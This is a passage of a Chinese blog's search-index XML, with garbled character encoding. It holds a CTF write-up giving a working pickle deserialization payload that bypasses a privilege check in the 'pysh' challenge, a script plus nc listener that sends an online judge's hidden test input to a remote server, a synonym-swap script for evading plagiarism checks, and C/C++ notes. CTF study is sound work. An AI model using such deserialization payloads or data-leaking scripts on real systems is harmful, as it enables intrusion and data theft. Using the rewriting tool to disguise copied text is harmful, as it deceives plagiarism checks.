class="python">import securePickle as pickleimport codecsimport ospickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.key = os.urandom(100)        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;whoami&#39;: self.cmd_whoami,            &#39;su&#39;: self.cmd_su,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        with open(&#39;../flag.txt&#39;, &#39;rb&#39;) as f:            flag = f.read()        flag = bytes(a ^ b for a, b in zip(self.key, flag))        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False        user.flag = flag        self.user = user    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_whoami(self):        print(self.user.name, self.user.group)    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        if not self.user.privileged:            print(&#39;flag: Permission denied&#39;)        else:            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>å¦‚æœæˆ‘ä»¬æƒ³æ‹¿åˆ°flag,è¦ä¹ˆå‘½ä»¤æ‰§è¡Œç›´æ¥æ‹¿flagè¦ä¹ˆå°±ä»¤<code>user.privileged=True</code> è°ƒç”¨cmd_flagæ¥æ‹¿flag</p><p>ä½†æ˜¯å†ååºåˆ—åŒ–å¤„</p><pre><code class="python">        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False</code></pre><p><code>user.privileged</code>ä¼šè¢«è¦†ç›–ä¸ºFalse,å†åº·åº·å…¶ä»–çš„ä¿¡æ¯æŠŠ</p><p><code>dir(structs)</code>:</p><pre><code class="python">[&#39;User&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><hr><p>å‡ ä¸ªå°æ—¶å,çœ‹wpå­¦æˆå½’æ¥.</p><p>æˆ‘:è‰¹,å¤ªéªšäº†,å¸ˆå‚…ä»¬ç‰›é€¼æ­»äº†</p><hr><p>ä¹‹å‰è¯´æœ‰ä¸¤ä¸ªè§£é¢˜æ€è·¯,å‘½ä»¤æ‰§è¡Œè¿™ä¸€ä¸ªæ€è·¯åœ¨çœ‹äº†ä¸€ä¼šä¹‹åå°±è§‰å¾—ä¸å¤ªè¡Œ,æ¯«æ— å¤´ç»ª</p><p>å†åº·åº·è®©<code>user.privileged=False</code>å¤±æ•ˆè¿™ä¸€æ€è·¯,emmmmæ„Ÿè§‰ä¹Ÿä¸å¤ªè¡Œ.</p><p>ä½†æ˜¯,ç±»çš„èµ‹å€¼è‚¯å®šä¼šå—åˆ°ä¸€äº›ç‰¹æ®Šå‡½æ•°çš„å½±å“</p><p>åœ¨ç ”ç©¶ç±»çš„èµ‹å€¼çš„æ—¶å€™å¯ä»¥æ‰¾åˆ°<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">æè¿°ç¬¦</a>å¯ä»¥è‡ªå®šä¹‰èµ‹å€¼å‡½æ•°</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½è®©Userçš„<code>__set__</code>å˜æˆä¸€ä¸ªæ¥å—3ä¸ªå‚æ•°çš„å‡½æ•°,å°±å¯ä»¥ä»¤<code>user.privileged=False</code>æ— æ•ˆ</p><p>ä½†æ˜¯å¾ˆæ˜¾ç„¶pickleé‡Œæ˜¯æ— æ³•ç›´æ¥ç¼–å†™ä»£ç çš„,ä»¤<code>__set__=&quot;&quot;</code>?æ›´ä¸è¡Œ,ä¼šç›´æ¥æŠ¥é”™</p><p>ç»§ç»­é˜…è¯»ä»£ç æˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;        print(&quot;name:%s ,group:%s&quot;%(name,group))</code></pre><p><code>User.__init__</code>åˆšå¥½æ¥å—ä¸‰ä¸ªå‚æ•°</p><p>æˆ‘ä»¬èƒ½ä¸èƒ½è®©<code>__set__=User</code>?,ç„¶åè°ƒç”¨<code>__set__</code>çš„æ—¶å€™è°ƒç”¨<code>User.__init__</code></p><pre><code class="python">&gt;&gt;&gt; setattr(User,&#39;test&#39;,User(123,123))name:123 ,group:123&gt;&gt;&gt; setattr(User,&quot;__set__&quot;,User)&gt;&gt;&gt; b=User(123,123)name:123 ,group:123&gt;&gt;&gt; b.test=123123name:&lt;structs.User object at 0x0000017BA1538748&gt; ,group:123123</code></pre><p>äºæ˜¯æ„é€ :</p><pre><code class="python">a=__import__(&quot;structs&quot;).Userb=User(&quot;123&quot;,&quot;456&quot;)setattr(a,&quot;privileged&quot;,b)setattr(a,&quot;__set__&quot;,a)return b</code></pre><p>å¯¹åº”çš„pickleä»£ç ä¸º</p><pre><code>cstructsUserp100(S&quot;123&quot;S&quot;456&quot;tRp101g100(N}S&#39;privileged&#39;g101sS&#39;__set__&#39;g100stbg101.</code></pre><pre><code>$ helpAvailable commands: help whoami su flag$ whoami123 456$ flagb&#39;Balsn{pY7h0n1dae_ObJ3c7}\n&#39;</code></pre><p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p><p> <a href="https://xz.aliyun.com/t/5306" target="_blank" rel="noopener">https://xz.aliyun.com/t/5306</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/16/pickle/">https://explorersss.github.io/2019/12/16/pickle/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡</title>
      <link href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/"/>
      <url>/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡"><a href="#å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡" class="headerlink" title="å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡"></a>å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡</h1><pre><code class="python">import sysif len(sys.argv) !=2:    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])    exit()import synonymsf=sys.argv[1]s=&quot;&quot;with open(f,&quot;r&quot;) as fl:    s=fl.read()resstr,stype=synonyms.seg(s)with open(sys.argv[2],&quot;w&quot;) as fw:    for i in resstr:        if len(i)==1:            fw.write(i)        else :            nearbystr,num=synonyms.nearby(i)            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:                print(nearbystr[1],num[1])                fw.write(nearbystr[1])            else :                fw.write(i)</code></pre><p>å¯ä»¥è°ƒæ•´<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>æ¥ä¿®æ”¹è¿‘ä¹‰è¯çš„å‡†ç¡®ç‡.</p><p>ç”¨å®Œä¹‹åä¸€å®šè¦è‡ªå·±æ ¡å¯¹ä¸€é!!!ä¸ç„¶â€¦..</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/15/å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡/">https://explorersss.github.io/2019/12/15/å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨çº¿ojè·å–æ•°æ®</title>
      <link href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨çº¿ojè·å–æ•°æ®"><a href="#åœ¨çº¿ojè·å–æ•°æ®" class="headerlink" title="åœ¨çº¿ojè·å–æ•°æ®"></a>åœ¨çº¿ojè·å–æ•°æ®</h1><p>python3:</p><pre><code class="python">import socketimport sys    ip = &#39;39.108.164.219&#39;port = 60000def send_raw(raw):    try:        with socket.create_connection((ip, port), timeout=10) as conn:            conn.send(bytes(raw,encoding=&quot;ascii&quot;))            conn.close()    except:        return False      return Truedata=&quot;&quot;for line in sys.stdin:    data+=linesend_raw(data)</code></pre><p>vpsä¸Šè¿è¡Œ</p><pre><code class="shell">#!/bin/bashi=1while [ $i -eq 1 ]do      nc -FNlp 60000  &gt;&gt; /tmp/data    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/datadone</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/15/åœ¨çº¿ojè·å–æ•°æ®/">https://explorersss.github.io/2019/12/15/åœ¨çº¿ojè·å–æ•°æ®/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨</title>
      <link href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/"/>
      <url>/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨"><a href="#ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨" class="headerlink" title="ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨"></a>ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨</h1><h2 id="ä»¤äººç–‘æƒ‘çš„ç»“æœ"><a href="#ä»¤äººç–‘æƒ‘çš„ç»“æœ" class="headerlink" title="ä»¤äººç–‘æƒ‘çš„ç»“æœ"></a>ä»¤äººç–‘æƒ‘çš„ç»“æœ</h2><p>æ¥çœ‹ä¸€ä¸ªä»£ç å§</p><pre><code class="c++">#include&lt;stdio.h&gt;int i=0;int update(){i++;return i;}int main(){    printf(&quot;update():%d i:%d\n&quot;,update(),i);    return 0;}</code></pre><p>ä½ è§‰å¾—å®ƒçš„è¾“å‡ºç»“æœæ˜¯ä»€ä¹ˆ<br><del>update():1 i:1</del> ?<br><strong>é”™</strong>ï¼Œæ­£ç¡®è¾“å‡ºæ˜¯<code>update():1 i:0</code></p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>ä¸ºä½•ä¼šå¦‚æ­¤,å…ˆæ¥åšä¸ªå®éªŒåº·åº·å§:</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    printf(&quot;----------------------------test printf----------------------------\n&quot;);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;update():%d i:%d\n&quot;,update(),i);    printf(&quot;later:%d\n&quot;,i);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;i:%d update():%d \n&quot;,i,update());    printf(&quot;later:%d\n&quot;,i);    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());}</code></pre><p>å®ƒçš„è¾“å‡ºç»“æœæ˜¯</p><pre><code>----------------------------test printf----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><p>åªæœ‰printfæ˜¯è¿™æ ·çš„?ä¸ï¼Œå¯å˜å‚æ•°çš„æ‰“å°å‡½æ•°éƒ½å…·æœ‰è¿™æ ·çš„ç‰¹æ€§<br>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹coutæ¥éªŒè¯ä¸€ä¸‹</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;    i=0;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;}</code></pre><p>å®ƒçš„è¾“å‡ºç»“æœæ˜¯:</p><pre><code>---------------------------- test cout ----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><h2 id="æ±‡ç¼–å±‚é¢çš„è§£é‡Š"><a href="#æ±‡ç¼–å±‚é¢çš„è§£é‡Š" class="headerlink" title="æ±‡ç¼–å±‚é¢çš„è§£é‡Š"></a>æ±‡ç¼–å±‚é¢çš„è§£é‡Š</h2><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·,è¿™å°±å¿…é¡»è¯´èµ·cå’Œc++ä¸­å…³äºå‡½æ•°ä¼ å‚çš„è¿‡ç¨‹äº†:</p><p>åœ¨æ±‡ç¼–ä¸­å‡½æ•°ä¼ å‚è¦ä»æœ€åä¸€ä¸ªå‚æ•°åˆ°ç¬¬ä¸€ä¸ªå‚æ•°åˆ†åˆ«å…¥æ ˆï¼Œè¿™æ ·å‡½æ•°å–å‚æ•°çš„æ—¶å€™ï¼Œpopå‡ºæ¥çš„é¡ºåºæ‰æ˜¯1-nã€‚</p><p>å› æ­¤,åœ¨<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>ä¸­,å‡½æ•°å…ˆå‹å…¥i,å†æ‰§è¡Œupdate(),å°†å…¶è¿”å›å€¼å‹å…¥æ ˆã€‚</p><p>ä»¥ä¸Šåªæ˜¯ç†è®ºï¼ŒçœŸå®çš„ç¯å¢ƒä¸­ç”±x86,x64,32ä½,16ä½æœº,å®ƒä»¬çš„å…·ä½“çš„ä¼ å‚æ–¹å¼ç•¥æœ‰ä¸åŒ:)  </p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹x64ä¸‹è¿™ä¸€æ¡è¯­å¥çš„æ±‡ç¼–ä»£ç </p><pre><code>mov     ebx, cs:icall    _Z6updatev      ; update(void)mov     r8d, ebxmov     edx, eaxlea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>åœ¨X64ä¸‹,æ˜¯å¯„å­˜å™¨ä¼ å‚. å‰4ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ rcx rdx r8 r9è¿›è¡Œä¼ å‚.å¤šä½™çš„é€šè¿‡æ ˆä¼ å‚.ä»å³å‘å·¦å…¥æ ˆã€‚</p><p>ä¸Šè¿°ä»£ç ä¸­ æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨rcxä¸­(æœ€åä¸€ä¸ªèµ‹å€¼),update()è¿”å›å€¼åœ¨edx,ä¸­ç¬¬äºŒä¸ªèµ‹å€¼ã€‚iåœ¨r8ä¸­ç¬¬ä¸€ä¸ªèµ‹å€¼ ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>mov     ebx, cs:i</code>ç¨‹åºå…ˆå°†içš„å€¼ç§»åŠ¨åˆ°ebxä¸­ï¼Œå†è°ƒç”¨updateå‡½æ•°,å°†è¿”å›å€¼æ‰€åœ¨å¯„å­˜å™¨eaxç§»åŠ¨åˆ°edxä¸­ã€‚</p><p>è™½ç„¶è¿‡ç¨‹æœ‰ç‚¹å˜åŒ–,ä½†æ˜¯æœ€åçš„ç»“æœè¿˜æ˜¯å’Œåœ¨æ±‡ç¼–ä¸­å‡½æ•°ä¼ å‚è¦ä»æœ€åä¸€ä¸ªå‚æ•°åˆ°ç¬¬ä¸€ä¸ªå‚æ•°åˆ†åˆ«å…¥æ ˆã€‚</p><h2 id="æ¥ç»ƒä¹ ä¸€ä¸‹å§"><a href="#æ¥ç»ƒä¹ ä¸€ä¸‹å§" class="headerlink" title="æ¥ç»ƒä¹ ä¸€ä¸‹å§"></a>æ¥ç»ƒä¹ ä¸€ä¸‹å§</h2><p>æœ€åä¸Šä¸€ä¸ªé¢˜ç›®å§//</p><pre><code class="c++">#include &lt;stdio.h&gt;int main(){    long long a = 1, b = 2, c = 3;    printf(&quot;%d %d %d\n&quot;, a,b,c);    return 0;}</code></pre><p>æ±‚è¾“å‡º</p><p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">ç­”æ¡ˆå’Œè§£æ</a></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/14/ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨/">https://explorersss.github.io/2019/12/14/ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/2019/12/14/hello-world/"/>
      <url>/2019/12/14/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/14/hello-world/">https://explorersss.github.io/2019/12/14/hello-world/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
